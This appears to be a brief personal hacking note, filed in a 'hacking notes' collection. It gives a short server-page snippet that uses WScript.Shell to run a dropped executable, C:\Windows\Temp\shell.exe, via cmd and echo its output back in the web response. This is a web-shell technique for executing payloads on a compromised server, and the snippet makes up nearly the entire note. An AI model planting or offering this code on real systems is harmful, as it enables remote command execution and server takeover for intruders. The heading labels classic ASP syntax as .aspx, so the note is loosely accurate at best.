# Active Sever Pages Extended (.aspx) Execute a File
```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

` zet/20221003150555/README.md `

# Related

- [20221007220451](/zet/20221007220451/README.md) hacking notes node

Tags:

    
